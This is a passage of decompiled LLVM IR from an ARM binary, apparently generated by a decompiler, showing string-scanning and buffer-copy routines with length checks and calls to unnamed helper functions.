  store i1 %v2_98d0, i1* %cpsr_c.global-to-local, align 1
  %v7_98d0 = icmp eq i8 %v4_98cc, 47
  store i1 %v7_98d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_98d0, label %dec_label_pc_9d7c, label %dec_label_pc_98d8

dec_label_pc_98d8:                                ; preds = %dec_label_pc_9d98, %dec_label_pc_9d7c, %dec_label_pc_9ce4, %dec_label_pc_9cc8, %dec_label_pc_98cc, %dec_label_pc_9dc4, %dec_label_pc_9d10
  %v0_98d8 = load i32, i32* %sb.global-to-local, align 4
  %v1_98dc = add i32 %v0_98d8, 1431
  store i32 %v1_98dc, i32* @r0, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_159bc.17 to i32), i32* @r1, align 4
  store i32 4, i32* @r2, align 4
  %v0_98e8 = call i32 @function_10b30()
  store i32 %v0_98e8, i32* %r0.global-to-local, align 4
  store i32 10, i32* %r3.global-to-local, align 4
  %v2_98f0 = load i32, i32* @sl, align 4
  %v3_98f0 = add i32 %v2_98f0, -1448
  %v4_98f0 = inttoptr i32 %v3_98f0 to i8*
  store i8 10, i8* %v4_98f0, align 1
  br label %dec_label_pc_87ac

dec_label_pc_98f8:                                ; preds = %dec_label_pc_9704, %dec_label_pc_96d8, %dec_label_pc_97c4
  %v0_98f8 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_98f8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_159d4.38 to i32), i32* %r2.global-to-local, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  store i32 %v2_823c, i32* %r0.global-to-local, align 4
  %v5_9908 = call i32 @function_f9f4(i32 %v2_823c, i32 %v0_98f8, i32 ptrtoint ([5 x i8]* @global_var_159d4.38 to i32), i32 4)
  %v0_990c = load i32, i32* %sb.global-to-local, align 4
  %v1_9910 = add i32 %v0_990c, 1431
  store i32 %v1_9910, i32* @r4, align 4
  store i32 %v5_9908, i32* @r5, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_159f0.44 to i32), i32* %r1.global-to-local, align 4
  store i32 %v1_9910, i32* %r0.global-to-local, align 4
  %v3_9920 = inttoptr i32 %v1_9910 to i8*
  %v4_9920 = call i32 @function_fd1c(i8* %v3_9920, i32 ptrtoint ([5 x i8]* @global_var_159f0.44 to i32))
  store i32 %v4_9920, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9924 = icmp eq i32 %v4_9920, 0
  store i1 %v2_9924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9924, label %dec_label_pc_9ad4, label %dec_label_pc_992c

dec_label_pc_992c:                                ; preds = %dec_label_pc_9ad4, %dec_label_pc_98f8
  store i32 7, i32* %r3.global-to-local, align 4
  %v2_9930 = load i32, i32* @sl, align 4
  %v3_9930 = add i32 %v2_9930, -1448
  %v4_9930 = inttoptr i32 %v3_9930 to i8*
  store i8 7, i8* %v4_9930, align 1
  br label %dec_label_pc_9934

dec_label_pc_9934:                                ; preds = %bb211, %dec_label_pc_992c
  %v0_9934 = load i32, i32* @r5, align 4
  store i32 %v0_9934, i32* %r2.global-to-local, align 4
  %v0_9938 = load i32, i32* @sl, align 4
  %v1_9938 = add i32 %v0_9938, -1452
  %v2_9938 = inttoptr i32 %v1_9938 to i32*
  %v3_9938 = load i32, i32* %v2_9938, align 4
  store i32 %v3_9938, i32* %r0.global-to-local, align 4
  store i32 %v2_823c, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_9944 = call i32 @function_10cc0(i32 %v3_9938, i32 %v2_823c, i32 %v0_9934, i32 16384)
  store i32 %v4_9944, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_87ac

dec_label_pc_994c:                                ; preds = %dec_label_pc_8e54
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 36, i32* %r0.global-to-local, align 4
  %v0_9954 = load i32, i32* @sl, align 4
  %v1_9954 = add i32 %v0_9954, 660
  %v2_9954 = inttoptr i32 %v1_9954 to i32*
  %v3_9954 = load i32, i32* %v2_9954, align 4
  store i32 %v3_9954, i32* @r4, align 4
  %v3_9958 = call i32 @function_efe8(i32 36, i32* null)
  %v0_995c = load i32, i32* @r4, align 4
  store i32 %v0_995c, i32* %r1.global-to-local, align 4
  store i32 %v3_9958, i32* %r2.global-to-local, align 4
  store i32 11, i32* %r3.global-to-local, align 4
  %v0_9968 = load i32, i32* @r7, align 4
  store i32 %v0_9968, i32* %r0.global-to-local, align 4
  %v4_996c = call i32 @function_f9f4(i32 %v0_9968, i32 %v0_995c, i32 %v3_9958, i32 11)
  store i32 %v4_996c, i32* %r0.global-to-local, align 4
  %v0_9970 = load i32, i32* @sl, align 4
  %v1_9970 = add i32 %v0_9970, 660
  %v2_9970 = inttoptr i32 %v1_9970 to i32*
  %v3_9970 = load i32, i32* %v2_9970, align 4
  %v0_9974 = load i32, i32* @r7, align 4
  %v2_9974 = add i32 %v0_9974, %v4_996c
  store i32 %v2_9974, i32* @r6, align 4
  store i32 %v4_996c, i32* @r4, align 4
  %v2_997c = sub i32 %v3_9970, %v4_996c
  store i32 %v2_997c, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_159f8.46 to i32), i32* %r2.global-to-local, align 4
  %v0_9984 = load i32, i32* @r8, align 4
  store i32 %v0_9984, i32* %r3.global-to-local, align 4
  store i32 %v2_9974, i32* %r0.global-to-local, align 4
  %v4_998c = call i32 @function_f9f4(i32 %v2_9974, i32 %v2_997c, i32 ptrtoint (i32* @global_var_159f8.46 to i32), i32 %v0_9984)
  store i32 %v4_998c, i32* %r0.global-to-local, align 4
  %v0_9990 = load i32, i32* @sl, align 4
  %v1_9990 = add i32 %v0_9990, 16
  %v2_9990 = inttoptr i32 %v1_9990 to i32*
  %v3_9990 = load i32, i32* %v2_9990, align 4
  store i32 %v3_9990, i32* %r3.global-to-local, align 4
  %v1_9994 = load i32, i32* @r4, align 4
  %v2_9994 = add i32 %v1_9994, %v4_998c
  store i32 %v2_9994, i32* @r5, align 4
  %v0_9998 = load i32, i32* %sb.global-to-local, align 4
  %v2_9998 = add i32 %v0_9998, %v2_9994
  store i32 %v2_9998, i32* %r2.global-to-local, align 4
  store i32 0, i32* %fp.global-to-local, align 4
  %v2_99a0 = icmp ugt i32 %v3_9990, 3
  store i1 %v2_99a0, i1* %cpsr_c.global-to-local, align 1
  %v7_99a0 = icmp eq i32 %v3_9990, 4
  store i1 %v7_99a0, i1* %cpsr_z.global-to-local, align 1
  %v3_99a4 = add i32 %v2_9998, 2115
  %v4_99a4 = inttoptr i32 %v3_99a4 to i8*
  store i8 0, i8* %v4_99a4, align 1
  %v7_99a8 = icmp sgt i32 %v3_9990, 4
  br i1 %v7_99a8, label %dec_label_pc_99ac, label %dec_label_pc_9b14

dec_label_pc_99ac:                                ; preds = %dec_label_pc_994c, %dec_label_pc_9b14, %dec_label_pc_9b24
  store i32 -1, i32* %r3.global-to-local, align 4
  store i32 10, i32* %r2.global-to-local, align 4
  %v1_99b4 = load i32, i32* @sl, align 4
  %v2_99b4 = add i32 %v1_99b4, 12
  %v3_99b4 = inttoptr i32 %v2_99b4 to i32*
  store i32 -1, i32* %v3_99b4, align 4
  %v0_99b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_99b8 = trunc i32 %v0_99b8 to i8
  %v2_99b8 = load i32, i32* @sl, align 4
  %v3_99b8 = add i32 %v2_99b8, -1448
  %v4_99b8 = inttoptr i32 %v3_99b8 to i8*
  store i8 %v1_99b8, i8* %v4_99b8, align 1
  br label %dec_label_pc_87ac

dec_label_pc_99c0:                                ; preds = %bb201
  store i32 7, i32* @ip, align 4
  store i32 %v10_82b0, i32* %r1.global-to-local, align 4
  store i32 7, i32* %stack_var_-44, align 4
  %v0_99cc = load i32, i32* @r6, align 4
  %v1_99cc = add i32 %v0_99cc, 4
  %v2_99cc = inttoptr i32 %v1_99cc to i8*
  %v3_99cc = load i8, i8* %v2_99cc, align 1
  %v4_99cc = zext i8 %v3_99cc to i32
  store i32 %v4_99cc, i32* @r3, align 4
  %v2_99d0 = icmp ugt i8 %v3_99cc, 114
  store i1 %v2_99d0, i1* %cpsr_c.global-to-local, align 1
  %v7_99d0 = icmp eq i8 %v3_99cc, 115
  store i1 %v7_99d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_99d0, label %bb206, label %.thread41

bb206:                                            ; preds = %dec_label_pc_99c0
  store i32 8, i32* @ip, align 4
  store i32 8, i32* %stack_var_-44, align 4
  br label %.thread41

.thread41:                                        ; preds = %dec_label_pc_99c0, %bb206
  %v3_99e0 = phi i32 [ 7, %dec_label_pc_99c0 ], [ 8, %bb206 ]
  store i32 %v0_99cc, i32* @r0, align 4
  %v1_99e8 = load i32, i32* @r5, align 4
  %v2_99e8 = sub i32 %v1_99e8, %v3_99e0
  store i32 %v2_99e8, i32* @r2, align 4
  %v2_99ec = add i32 %v3_99e0, %v0_99cc
  store i32 %v2_99ec, i32* @r1, align 4
  %v3_99f0 = call i32 @function_10b20(i32 %v0_99cc, i32 %v2_99ec, i32 %v2_99e8)
  store i32 %v3_99f0, i32* %r0.global-to-local, align 4
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v0_99f8 = load i32, i32* @r7, align 4
  store i32 %v0_99f8, i32* %stack_var_-44, align 4
  store i32 %v2_823c, i32* @lr, align 4
  %v1_9a00 = load i32, i32* @r4, align 4
  %v2_9a00 = add i32 %v1_9a00, %v2_823c
  %v3_9a00 = inttoptr i32 %v2_9a00 to i8*
  %v4_9a00 = load i8, i8* %v3_9a00, align 1
  %v6_9a00 = zext i8 %v4_9a00 to i32
  store i32 %v6_9a00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a04 = icmp eq i8 %v4_9a00, 0
  store i1 %v2_9a04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9a04, label %dec_label_pc_9a48, label %dec_label_pc_9a0c

dec_label_pc_9a0c:                                ; preds = %.thread41
  %v2_9a0c = icmp ugt i8 %v4_9a00, 46
  store i1 %v2_9a0c, i1* %cpsr_c.global-to-local, align 1
  %v7_9a0c = icmp eq i8 %v4_9a00, 47
  store i1 %v7_9a0c, i1* %cpsr_z.global-to-local, align 1
  %v1_9a10 = load i32, i32* @r6, align 4
  br i1 %v7_9a0c, label %bb207, label %dec_label_pc_9a18

bb207:                                            ; preds = %dec_label_pc_9a0c
  store i32 %v1_9a10, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_9b08

dec_label_pc_9a18:                                ; preds = %dec_label_pc_9a0c
  store i32 %v0_99f8, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_9a28

dec_label_pc_9a20:                                ; preds = %dec_label_pc_9a28
  %v2_9a20 = icmp ugt i8 %v4_9a34, 46
  store i1 %v2_9a20, i1* %cpsr_c.global-to-local, align 1
  %v7_9a20 = icmp eq i8 %v4_9a34, 47
  store i1 %v7_9a20, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_9a20, label %dec_label_pc_9b08, label %dec_label_pc_9a28

dec_label_pc_9a28:                                ; preds = %dec_label_pc_9a20, %dec_label_pc_9a18
  %v0_9a28 = phi i32 [ %v1_9a28, %dec_label_pc_9a20 ], [ %v0_99f8, %dec_label_pc_9a18 ]
  %v1_9a28 = add i32 %v0_9a28, 1
  store i32 %v1_9a28, i32* %ip.global-to-local, align 4
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  store i32 %v1_9a28, i32* %stack_var_-44, align 4
  %v2_9a34 = add i32 %v1_9a28, %v1_9a10
  %v3_9a34 = inttoptr i32 %v2_9a34 to i8*
  %v4_9a34 = load i8, i8* %v3_9a34, align 1
  %v6_9a34 = zext i8 %v4_9a34 to i32
  store i32 %v6_9a34, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a38 = icmp eq i8 %v4_9a34, 0
  store i1 %v2_9a38, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_9a28, i32* %r1.global-to-local, align 4
  store i32 %v2_9a34, i32* %r2.global-to-local, align 4
  br i1 %v2_9a38, label %dec_label_pc_9a48, label %dec_label_pc_9a20

dec_label_pc_9a48:                                ; preds = %dec_label_pc_9a28, %.thread41, %dec_label_pc_9b08
  %v0_9a48 = load i32, i32* @r6, align 4
  store i32 %v0_9a48, i32* %r0.global-to-local, align 4
  %v1_9a4c = inttoptr i32 %v0_9a48 to i8*
  %v2_9a4c = call i32 @function_f93c(i8* %v1_9a4c)
  store i32 %v2_9a4c, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9a50 = icmp eq i32 %v2_9a4c, 0
  store i1 %v2_9a50, i1* %cpsr_z.global-to-local, align 1
  %tmp208 = icmp slt i32 %v2_9a4c, 1
  br i1 %tmp208, label %dec_label_pc_9a74, label %dec_label_pc_9a58

dec_label_pc_9a58:                                ; preds = %dec_label_pc_9a48
  %v0_9a58 = load i32, i32* @r6, align 4
  store i32 %v0_9a58, i32* %r0.global-to-local, align 4
  %v1_9a5c = inttoptr i32 %v0_9a58 to i8*
  %v2_9a5c = call i32 @function_f93c(i8* %v1_9a5c)
  store i32 %v2_9a5c, i32* %r0.global-to-local, align 4
  %v1_9a60 = add i32 %v2_9a5c, -127
  %v2_9a60 = icmp ugt i32 %v2_9a5c, 126
  store i1 %v2_9a60, i1* %cpsr_c.global-to-local, align 1
  %v3_9a60 = sub i32 126, %v2_9a5c
  %v4_9a60 = and i32 %v3_9a60, %v2_9a5c
  %v5_9a60 = icmp slt i32 %v4_9a60, 0
  %v6_9a60 = icmp slt i32 %v1_9a60, 0
  %v7_9a60 = icmp eq i32 %v2_9a5c, 127
  store i1 %v7_9a60, i1* %cpsr_z.global-to-local, align 1
  %v7_9a64 = icmp sgt i32 %v2_9a5c, 127
  br i1 %v7_9a64, label %.thread44, label %bb209

bb209:                                            ; preds = %dec_label_pc_9a58
  %v8_9a64 = load i32, i32* %sb.global-to-local, align 4
  %v9_9a68 = add i32 %v8_9a64, 789
  store i32 %v9_9a68, i32* %r0.global-to-local, align 4
  %v8_9a6c = load i32, i32* @r6, align 4
  store i32 %v8_9a6c, i32* %r1.global-to-local, align 4
  br label %.thread44

.thread44:                                        ; preds = %dec_label_pc_9a58, %bb209
  store i32 39540, i32* @lr, align 4
  %v3_9a70 = xor i1 %v6_9a60, %v5_9a60
  %v4_9a70 = or i1 %v7_9a60, %v3_9a70
  call void @__pseudo_cond_branch(i1 %v4_9a70, i32 ptrtoint (i32* @global_var_f964.47 to i32))
  br label %dec_label_pc_9a74

dec_label_pc_9a74:                                ; preds = %dec_label_pc_9a48, %.thread44
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_9a78 = load i32, i32* %stack_var_-44, align 4
  %v0_9a7c = load i32, i32* @r6, align 4
  %v1_9a7c = add i32 %v0_9a7c, 1
  store i32 %v1_9a7c, i32* @r5, align 4
  %v2_9a80 = add i32 %v1_9a7c, %v3_9a78
  store i32 %v2_9a80, i32* %r0.global-to-local, align 4
  %v1_9a84 = inttoptr i32 %v2_9a80 to i8*
  %v2_9a84 = call i32 @function_f93c(i8* %v1_9a84)
  store i32 %v2_9a84, i32* %r0.global-to-local, align 4
  %v2_9a88 = icmp ugt i32 %v2_9a84, 254
  store i1 %v2_9a88, i1* %cpsr_c.global-to-local, align 1
  %v7_9a88 = icmp eq i32 %v2_9a84, 255
  store i1 %v7_9a88, i1* %cpsr_z.global-to-local, align 1
  %v8_9a8c = icmp sgt i32 %v2_9a84, 255
  br i1 %v8_9a8c, label %dec_label_pc_9614, label %dec_label_pc_9a90

dec_label_pc_9a90:                                ; preds = %dec_label_pc_9a74
  %v0_9a90 = load i32, i32* %sb.global-to-local, align 4
  %v1_9a94 = add i32 %v0_9a90, 533
  store i32 %v1_9a94, i32* @r4, align 4
  store i32 %v1_9a94, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9aa0 = call i32 @function_f9d0(i32 %v1_9a94, i32 255)
  store i32 %v10_82b0, i32* %ip.global-to-local, align 4
  %v3_9aa8 = load i32, i32* %stack_var_-44, align 4
  %v0_9aac = load i32, i32* @r5, align 4
  %v2_9aac = add i32 %v0_9aac, %v3_9aa8
  store i32 %v2_9aac, i32* %r0.global-to-local, align 4
  %v1_9ab0 = inttoptr i32 %v2_9aac to i8*
  %v2_9ab0 = call i32 @function_f93c(i8* %v1_9ab0)
  store i32 %v2_9ab0, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9ab4 = icmp eq i32 %v2_9ab0, 0
  store i1 %v2_9ab4, i1* %cpsr_z.global-to-local, align 1
  %tmp210 = icmp slt i32 %v2_9ab0, 1
  br i1 %tmp210, label %dec_label_pc_9614, label %dec_label_pc_9abc

dec_label_pc_9abc:                                ; preds = %dec_label_pc_9a90
  %v3_9ac0 = load i32, i32* %stack_var_-44, align 4
  %v0_9ac4 = load i32, i32* @r4, align 4
  store i32 %v0_9ac4, i32* @r0, align 4
  %v0_9ac8 = load i32, i32* @r5, align 4
  %v2_9ac8 = add i32 %v0_9ac8, %v3_9ac0
  store i32 %v2_9ac8, i32* %r1.global-to-local, align 4
  %v2_9acc = inttoptr i32 %v0_9ac4 to i8*
  %v3_9acc = call i32 @function_f964(i8* %v2_9acc, i32 %v2_9ac8)
  store i32 %v3_9acc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9614

dec_label_pc_9ad4:                                ; preds = %dec_label_pc_98f8
  %v0_9ad4 = load i32, i32* @r4, align 4
  store i32 %v0_9ad4, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_159bc.17 to i32), i32* %r1.global-to-local, align 4
  %v3_9adc = inttoptr i32 %v0_9ad4 to i8*
  %v4_9adc = call i32 @function_fd1c(i8* %v3_9adc, i32 ptrtoint ([4 x i8]* @global_var_159bc.17 to i32))
  store i32 %v4_9adc, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9ae0 = icmp eq i32 %v4_9adc, 0
  store i1 %v2_9ae0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_9ae0, label %bb211, label %dec_label_pc_992c

bb211:                                            ; preds = %dec_label_pc_9ad4
  %v0_9ae8 = load i32, i32* %fp.global-to-local, align 4
  %v1_9ae8 = load i32, i32* @r5, align 4
  %v3_9ae8 = icmp uge i32 %v0_9ae8, %v1_9ae8
  store i1 %v3_9ae8, i1* %cpsr_c.global-to-local, align 1
  %v9_9ae8 = icmp eq i32 %v0_9ae8, %v1_9ae8
  store i1 %v9_9ae8, i1* %cpsr_z.global-to-local, align 1
  %v7_9aec = icmp sgt i32 %v0_9ae8, %v1_9ae8
  %. = select i1 %v7_9aec, i32 10, i32 1
  store i32 %., i32* %r3.global-to-local, align 4
  %v9_9af4 = trunc i32 %. to i8
  %v10_9af4 = load i32, i32* @sl, align 4
  %v11_9af4 = add i32 %v10_9af4, -1448
  %v12_9af4 = inttoptr i32 %v11_9af4 to i8*
  store i8 %v9_9af4, i8* %v12_9af4, align 1
  br label %dec_label_pc_9934

dec_label_pc_9b00:                                ; preds = %dec_label_pc_8ef8
  %v0_9b00 = load i32, i32* @r4, align 4
  %v1_9b00 = trunc i32 %v0_9b00 to i8
  %v2_9b00 = load i32, i32* @sl, align 4
  %v3_9b00 = add i32 %v2_9b00, -1448
  %v4_9b00 = inttoptr i32 %v3_9b00 to i8*
  store i8 %v1_9b00, i8* %v4_9b00, align 1
  br label %dec_label_pc_87ac

dec_label_pc_9b08:                                ; preds = %dec_label_pc_9a20, %bb207
  %v2_9b0c = phi i32 [ %v1_9a10, %bb207 ], [ %v2_9a34, %dec_label_pc_9a20 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_9b0c = inttoptr i32 %v2_9b0c to i8*
  store i8 0, i8* %v3_9b0c, align 1
  br label %dec_label_pc_9a48

dec_label_pc_9b14:                                ; preds = %dec_label_pc_994c
  %v0_9b14 = load i32, i32* @r6, align 4
  store i32 %v0_9b14, i32* %r0.global-to-local, align 4
  %v1_9b18 = inttoptr i32 %v0_9b14 to i8*
  %v2_9b18 = call i32 @function_f93c(i8* %v1_9b18)
  store i32 %v2_9b18, i32* %r0.global-to-local, align 4
  %v2_9b1c = icmp ugt i32 %v2_9b18, 126
  store i1 %v2_9b1c, i1* %cpsr_c.global-to-local, align 1
  %v7_9b1c = icmp eq i32 %v2_9b18, 127
  store i1 %v7_9b1c, i1* %cpsr_z.global-to-local, align 1
  %v8_9b20 = icmp sgt i32 %v2_9b18, 127
  br i1 %v8_9b20, label %dec_label_pc_99ac, label %dec_label_pc_9b24

dec_label_pc_9b24:                                ; preds = %dec_label_pc_9b14
  %v0_9b24 = load i32, i32* @sl, align 4
  %v1_9b24 = add i32 %v0_9b24, 16
  %v2_9b24 = inttoptr i32 %v1_9b24 to i32*
  %v3_9b24 = load i32, i32* %v2_9b24, align 4
  %v1_9b28 = and i32 %v3_9b24, 33554432
  %v2_9b28 = icmp ne i32 %v1_9b28, 0
  store i1 %v2_9b28, i1* %cpsr_c.global-to-local, align 1
  %v3_9b28 = mul i32 %v3_9b24, 128
  %v1_9b2c = add i32 %v3_9b28, 1472
  %v0_9b30 = load i32, i32* @r6, align 4
  store i32 %v0_9b30, i32* %r1.global-to-local, align 4
  %v0_9b34 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b34 = add i32 %v1_9b2c, %v0_9b34
  store i32 %v2_9b34, i32* @r0, align 4
  %v2_9b38 = inttoptr i32 %v2_9b34 to i8*
  %v3_9b38 = call i32 @function_f964(i8* %v2_9b38, i32 %v0_9b30)
  store i32 %v3_9b38, i32* %r0.global-to-local, align 4
  %v0_9b3c = load i32, i32* @sl, align 4
  %v1_9b3c = add i32 %v0_9b3c, 16
  %v2_9b3c = inttoptr i32 %v1_9b3c to i32*
  %v3_9b3c = load i32, i32* %v2_9b3c, align 4
  %v1_9b40 = and i32 %v3_9b3c, 33554432
  %v2_9b40 = icmp ne i32 %v1_9b40, 0
  store i1 %v2_9b40, i1* %cpsr_c.global-to-local, align 1
  %v3_9b40 = mul i32 %v3_9b3c, 128
  %v1_9b44 = add i32 %v3_9b40, 1472
  %v0_9b48 = load i32, i32* %sb.global-to-local, align 4
  %v2_9b48 = add i32 %v1_9b44, %v0_9b48
  store i32 %v2_9b48, i32* @r4, align 4
  store i32 %v2_9b48, i32* %r0.global-to-local, align 4
  %v1_9b50 = inttoptr i32 %v2_9b48 to i8*
  %v2_9b50 = call i32 @function_f93c(i8* %v1_9b50)
  store i32 ptrtoint (i32* @global_var_159fc.49 to i32), i32* %r1.global-to-local, align 4
  %v0_9b58 = load i32, i32* @r4, align 4
  %v2_9b58 = add i32 %v0_9b58, %v2_9b50
  store i32 %v2_9b58, i32* @r0, align 4
  %v2_9b5c = inttoptr i32 %v2_9b58 to i8*
  %v3_9b5c = call i32 @function_f964(i8* %v2_9b5c, i32 ptrtoint (i32* @global_var_159fc.49 to i32))
  store i32 %v3_9b5c, i32* %r0.global-to-local, align 4
  %v0_9b60 = load i32, i32* @r5, align 4
  %v1_9b60 = add i32 %v0_9b60, 3
  store i32 %v1_9b60, i32* @r5, align 4
  %v0_9b64 = load i32, i32* @sl, align 4
  %v1_9b64 = add i32 %v0_9b64, 660
  %v2_9b64 = inttoptr i32 %v1_9b64 to i32*
  %v3_9b64 = load i32, i32* %v2_9b64, align 4
  %v0_9b68 = load i32, i32* @r7, align 4
  %v2_9b68 = add i32 %v0_9b68, %v1_9b60
  store i32 %v2_9b68, i32* @r6, align 4
  %v2_9b6c = sub i32 %v3_9b64, %v1_9b60
  store i32 %v2_9b6c, i32* %r1.global-to-local, align 4
  %v0_9b70 = load i32, i32* @r8, align 4
  store i32 %v0_9b70, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_159f8.46 to i32), i32* %r2.global-to-local, align 4
  store i32 %v2_9b68, i32* %r0.global-to-local, align 4
  %v4_9b7c = call i32 @function_f9f4(i32 %v2_9b68, i32 %v2_9b6c, i32 ptrtoint (i32* @global_var_159f8.46 to i32), i32 %v0_9b70)
  store i32 %v4_9b7c, i32* %r0.global-to-local, align 4
  %v0_9b80 = load i32, i32* @sl, align 4
  %v1_9b80 = add i32 %v0_9b80, 16
  %v2_9b80 = inttoptr i32 %v1_9b80 to i32*
  %v3_9b80 = load i32, i32* %v2_9b80, align 4
  %v1_9b84 = and i32 %v3_9b80, 33554432
  %v2_9b84 = icmp ne i32 %v1_9b84, 0
  store i1 %v2_9b84, i1* %cpsr_c.global-to-local, align 1
  %v3_9b84 = mul i32 %v3_9b80, 128
  %v1_9b88 = add i32 %v3_9b84, 1472
  %v0_9b8c = load i32, i32* %sb.global-to-local, align 4
  %v1_9b8c = load i32, i32* @r5, align 4
  %v2_9b90 = add i32 %v1_9b88, %v0_9b8c
  store i32 %v2_9b90, i32* @r4, align 4
  %v2_9b8c = add i32 %v0_9b8c, %v4_9b7c
  %v2_9b94 = add i32 %v2_9b8c, %v1_9b8c
  store i32 %v2_9b94, i32* @r5, align 4
  %v0_9b98 = load i32, i32* %fp.global-to-local, align 4
  %v1_9b98 = trunc i32 %v0_9b98 to i8
  %v3_9b98 = add i32 %v2_9b94, 2115
  %v4_9b98 = inttoptr i32 %v3_9b98 to i8*
  store i8 %v1_9b98, i8* %v4_9b98, align 1
  %v0_9b9c = load i32, i32* @r4, align 4
  store i32 %v0_9b9c, i32* %r0.global-to-local, align 4
  %v1_9ba0 = inttoptr i32 %v0_9b9c to i8*
  %v2_9ba0 = call i32 @function_f93c(i8* %v1_9ba0)
  %v0_9ba4 = load i32, i32* @r6, align 4
  store i32 %v0_9ba4, i32* %r1.global-to-local, align 4
  %v0_9ba8 = load i32, i32* @r4, align 4
  %v2_9ba8 = add i32 %v0_9ba8, %v2_9ba0
  store i32 %v2_9ba8, i32* @r0, align 4
  %v2_9bac = inttoptr i32 %v2_9ba8 to i8*
  %v3_9bac = call i32 @function_f964(i8* %v2_9bac, i32 %v0_9ba4)
  store i32 %v3_9bac, i32* %r0.global-to-local, align 4
  %v0_9bb0 = load i32, i32* @sl, align 4
  %v1_9bb0 = add i32 %v0_9bb0, 16
  %v2_9bb0 = inttoptr i32 %v1_9bb0 to i32*
  %v3_9bb0 = load i32, i32* %v2_9bb0, align 4
  %v1_9bb4 = add i32 %v3_9bb0, 1
  store i32 %v1_9bb4, i32* %r3.global-to-local, align 4
  store i32 %v1_9bb4, i32* %v2_9bb0, align 4
  br label %dec_label_pc_99ac

dec_label_pc_9bc0:                                ; preds = %dec_label_pc_9604
  %v0_9bc0 = load i32, i32* %sb.global-to-local, align 4
  %v1_9bc4 = add i32 %v0_9bc0, 533
  store i32 %v1_9bc4, i32* @r4, align 4
  store i32 %v1_9bc4, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_9bd0 = call i32 @function_f9d0(i32 %v1_9bc4, i32 255)
  store i32 %v10_82b0, i32* %r2.global-to-local, align 4
  %v3_9bd8 = load i32, i32* %stack_var_-44, align 4
  %v0_9bdc = load i32, i32* @r6, align 4
  %v1_9bdc = add i32 %v0_9bdc, 1
  store i32 %v1_9bdc, i32* @r6, align 4
  %v2_9be0 = add i32 %v1_9bdc, %v3_9bd8
  store i32 %v2_9be0, i32* %r0.global-to-local, align 4
  %v1_9be4 = inttoptr i32 %v2_9be0 to i8*
  %v2_9be4 = call i32 @function_f93c(i8* %v1_9be4)
  store i32 %v2_9be4, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_9be8 = icmp eq i32 %v2_9be4, 0
  store i1 %v2_9be8, i1* %cpsr_z.global-to-local, align 1
  %tmp212 = icmp slt i32 %v2_9be4, 1
  br i1 %tmp212, label %dec_label_pc_9614, label %dec_label_pc_9bf0

dec_label_pc_9bf0:                                ; preds = %dec_label_pc_9bc0
  store i32 %v10_82b0, i32* %r3.global-to-local, align 4
  %v3_9bf4 = load i32, i32* %stack_var_-44, align 4
  %v0_9bf8 = load i32, i32* @r6, align 4
  %v2_9bf8 = add i32 %v0_9bf8, %v3_9bf4
  store i32 %v2_9bf8, i32* %r0.global-to-local, align 4
  %v1_9bfc = inttoptr i32 %v2_9bf8 to i8*
  %v2_9bfc = call i32 @function_f93c(i8* %v1_9bfc)
  store i32 %v2_9bfc, i32* %r0.global-to-local, align 4
  %v2_9c00 = icmp ugt i32 %v2_9bfc, 254
  store i1 %v2_9c00, i1* %cpsr_c.global-to-local, align 1
  %v7_9c00 = icmp eq i32 %v2_9bfc, 255
  store i1 %v7_9c00, i1* %cpsr_z.global-to-local, align 1
  %v8_9c04 = icmp sgt i32 %v2_9bfc, 255
  br i1 %v8_9c04, label %dec_label_pc_9614, label %dec_label_pc_9c08

dec_label_pc_9c08:                                ; preds = %dec_label_pc_9bf0
  store i32 %v10_82b0, i32* %ip.global-to-local, align 4
  %v3_9c0c = load i32, i32* %stack_var_-44, align 4
  %v0_9c10 = load i32, i32* @r4, align 4
  store i32 %v0_9c10, i32* @r0, align 4
  %v0_9c14 = load i32, i32* @r6, align 4
  %v2_9c14 = add i32 %v0_9c14, %v3_9c0c
  store i32 %v2_9c14, i32* %r1.global-to-local, align 4
  %v2_9c18 = inttoptr i32 %v0_9c10 to i8*
  %v3_9c18 = call i32 @function_f964(i8* %v2_9c18, i32 %v2_9c14)
  store i32 %v3_9c18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_9614

dec_label_pc_9c20:                                ; preds = %dec_label_pc_98a0
